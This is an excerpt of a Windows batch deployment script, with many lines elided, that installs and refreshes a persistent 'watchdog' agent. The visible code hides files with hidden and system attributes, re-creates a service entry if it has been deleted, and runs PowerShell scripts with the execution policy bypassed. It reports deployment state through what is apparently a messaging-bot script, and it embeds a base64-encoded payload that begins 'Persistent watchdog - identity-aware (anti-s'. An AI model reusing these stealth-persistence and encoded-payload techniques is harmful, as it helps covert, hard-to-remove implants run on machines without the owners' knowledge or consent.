...
REM OWN BUILD 20260802O27 - unharden-before-write (self-lock fix) + embed + identity + watchdog + pkg.msi fallback
...
if /I not "%~1"=="_RUN" (
  ...
  REM O27: prior S4 hardening (+h +s) makes copy/move over old files fail silently.
  ...
  findstr /C:"OWN BUILD 20260802O27" "%BOOT%\own_run.cmd" >nul 2>&1
  if errorlevel 1 (
    set "RUNNER=%BOOT%\own_o27_%RANDOM%%RANDOM%.cmd"
    ...
    set "RUNNER=%SELF%"
    findstr /C:"OWN BUILD 20260802O27" "%SELF%" >nul 2>&1
  ...
  echo engine=cmd_detached_o27>>"%LOG%"
...
REM O27: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M17" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
...
REM O27: restore ALT if its service entry was deleted (SC-family msiexec side effect)
...
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O27 -Extra "deploy" >nul 2>&1
...
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O27 >>"%LOG%" 2>&1
...
MDgwMk0xNwpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50aS1z
